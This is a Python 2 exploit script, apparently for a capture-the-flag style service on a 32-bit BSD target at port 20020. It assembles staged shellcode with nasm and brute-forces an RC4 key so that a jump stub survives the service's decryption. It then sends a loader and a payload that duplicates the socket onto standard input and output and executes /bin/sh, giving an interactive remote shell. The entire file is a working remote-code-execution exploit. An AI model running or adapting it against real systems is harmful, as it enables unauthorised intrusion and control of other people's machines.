import os
import re
import sys
import struct
import socket
import binascii
import Crypto.Cipher.ARC4 as RC4

def connect(host,port):
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM, socket.IPPROTO_TCP)
	s.connect((host,port))
	return s

def netcat(s, prompt='> '):
	import sys
	import select
	print '--- netcat mode enabled ---'
	sys.stdout.write(prompt)
	sys.stdout.flush()
	try:
		while True:
			rfdl, wfdl, efdl = select.select([s, sys.stdin], [], [], None)
			if sys.stdin in rfdl:
				data = sys.stdin.readline().strip()
				if data == '!quit': break
				if not data: continue
				s.send(data+'\n')
			if s in rfdl:
				data = s.recv(4096)
				if not data:
					print 'netcat canceled: socket disconnected'
					break
				sys.stdout.write(data)
				sys.stdout.write(prompt)
				sys.stdout.flush()
	except KeyboardInterrupt:
		print 'netcat canceled: ctrl+c detected'
	print '--- netcat mode disabled ---'

def compileShellcode(data, debug=True):
	import os
	open('shellcode.tmp','wb').write(data)
	if os.system('nasm -Ox shellcode.tmp -o shellcode.bin'):
		raise Exception('failed to compile shellcode')
	return open('shellcode.bin','rb').read()

# void RC4_set_key(RC4_KEY *key, int len, const unsigned char *data);
# void RC4(RC4_KEY *key, unsigned long len, const unsigned char *indata, unsigned char *outdata);
# RC4_set_key(&key, strlen(data), data);
# RC4(&key, 0x20, 'A'*0x20, &ptr);
def RC4shaper(target):
	import itertools
	data = 'A'*0x20
	if len(target) > len(data): raise Exception('target error: buffer too small')
	data = data[:len(target)]
	for keylen in xrange(1,10):
		for key in itertools.product(*[xrange(1,256)]*keylen):
			key = ''.join([chr(i) for i in key])
			out = RC4.new(key).encrypt(data)
			if out == target: return key
	raise Exception('target error: no key found')

def exploit(host,port):
	print 'Preparing Payloads'
	stage0 = '''BITS 32
	jmp edi
	'''
	stage0 = compileShellcode(stage0)
	print '- stage0 e(%s)'%binascii.hexlify(stage0)
	stage0 = RC4shaper(stage0)
	print '- stage0',binascii.hexlify(stage0)

	stage1 = '''BITS 32
	xor eax, eax
	mov ebx, [ebp+8]
	mov ecx, 0x0804a6c0
	mov edx, 0x08048a08
	push eax       ; flags
	push byte 0x7f ; size
	push ecx       ; buffer
	push ebx       ; fd
	call edx       ; read
	jmp ecx'''
	stage1 = compileShellcode(stage1)
	print '- stage1',binascii.hexlify(stage1)

	stage2 = '''BITS 32
	; disable SIGARLM
	push byte 14
	mov ebx, 0x28250710
	call ebx

	; connect sockets
	xor ecx,ecx
	mov ebx, [ebp+8]
	dup_loop:
		push ecx ; newFD
		push ebx ; oldFD = socket
		mov al, 0x5a ; dup2(socket,0)
		push eax ; BSD syscall padding
		int 0x80
		inc ecx
		cmp ecx, 4
		jne dup_loop

	; call /bin/sh
	xor eax,eax
	push eax
	push 0x68732f6e ;
	push 0x69622f2f ; /bin/sh
	mov ebx, esp
	push eax
	mov edx, esp
	push ebx
	mov ecx, esp
	push eax
	push ecx
	push ebx
	mov al, 0x3b ; execve
	push eax ; BSD syscall padding
	int 0x80
	'''
	stage2 = compileShellcode(stage2)
	print '- stage2',binascii.hexlify(stage2)
	print

	print 'Connecting to Target'
	s=connect(host,port)
	print '- sending stage0 + stage1'
	s.send('\x22\x11\x00'+stage1+'\n')
	print '- sending stage2'
	s.send(stage2)
	print
	print 'Going Interactive'
	netcat(s)

if __name__ == '__main__':
	import sys
	if len(sys.argv) < 2:
		print 'usage: %s <host> [<port=20020>]'
		sys.exit(0)
	host =     sys.argv[1]  if len(sys.argv)>1 else ''
	port = int(sys.argv[2]) if len(sys.argv)>2 else 20020
	exploit(host,port)
